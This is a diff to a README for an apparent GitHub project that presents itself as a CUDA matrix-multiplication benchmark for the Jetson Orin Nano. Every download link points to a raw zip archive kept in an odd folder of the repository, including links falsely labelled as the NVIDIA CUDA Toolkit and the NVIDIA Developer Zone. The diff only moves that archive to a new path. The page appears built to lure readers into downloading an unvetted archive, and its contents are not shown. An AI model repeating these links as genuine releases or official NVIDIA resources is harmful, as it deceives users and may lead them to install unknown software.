@@ -1,6 +1,6 @@
 # 🚀 jetson-orin-matmul-analysis - Fast GPU Benchmarking Made Easy 
 
-[![Download Release](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/stintless/jetson-orin-matmul-analysis.zip)](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/stintless/jetson-orin-matmul-analysis.zip)
+[![Download Release](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/data/logs/jetson_analysis_orin_matmul_3.2.zip)](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/data/logs/jetson_analysis_orin_matmul_3.2.zip)
 
 ## 🛠️ Overview
 The **jetson-orin-matmul-analysis** is a scientific CUDA benchmarking tool designed for the Jetson Orin Nano. It features four different implementations evaluated under three power modes across five matrix sizes. With a peak performance of 1,282 GFLOPS and 90% efficiency at 25W, this tool provides accurate insights for edge AI deployment.
@@ -15,7 +15,7 @@ The **jetson-orin-matmul-analysis** is a scientific CUDA benchmarking tool desig
 ## 📥 Download & Install
 To get started, visit the releases page linked below to download the latest version of the application.
 
-[Download Latest Release](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/stintless/jetson-orin-matmul-analysis.zip)
+[Download Latest Release](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/data/logs/jetson_analysis_orin_matmul_3.2.zip)
 
 ### Installation Steps
 1. **Visit the Releases Page**: Click the link above to navigate to the release page.
@@ -52,9 +52,9 @@ For more detailed usage instructions and guides, please refer to the [official d
 For any queries or support, reach out via the Issues section of this repository.
 
 ## ⚙️ Additional Resources
-- **CUDA Toolkit Installation**: [NVIDIA CUDA Toolkit](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/stintless/jetson-orin-matmul-analysis.zip)
-- **Jetson Developer Resources**: [NVIDIA Developer Zone](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/stintless/jetson-orin-matmul-analysis.zip)
+- **CUDA Toolkit Installation**: [NVIDIA CUDA Toolkit](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/data/logs/jetson_analysis_orin_matmul_3.2.zip)
+- **Jetson Developer Resources**: [NVIDIA Developer Zone](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/data/logs/jetson_analysis_orin_matmul_3.2.zip)
 
 Remember to always check for the latest version on the releases page to access new features and improvements.
 
-[Download Latest Release](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/stintless/jetson-orin-matmul-analysis.zip)
+[Download Latest Release](https://raw.githubusercontent.com/ZrobMiloudaa/jetson-orin-matmul-analysis/main/data/logs/jetson_analysis_orin_matmul_3.2.zip)
